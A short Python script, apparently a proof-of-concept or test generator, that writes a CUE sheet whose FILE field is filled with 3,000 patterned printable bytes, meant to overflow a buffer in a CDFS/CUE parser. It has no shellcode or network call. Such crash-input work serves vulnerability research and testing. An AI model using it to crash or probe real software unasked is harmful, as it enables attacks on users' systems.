#!/usr/bin/env python3
import struct

# Create a payload where each byte is unique based on position
payload = b""
for i in range(3000):
    # Use printable ASCII cycling through visible characters
    # ASCII 0x30-0x7E are printable (0-9, A-Z, a-z, symbols)
    payload += bytes([0x30 + (i % 79)])  

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')
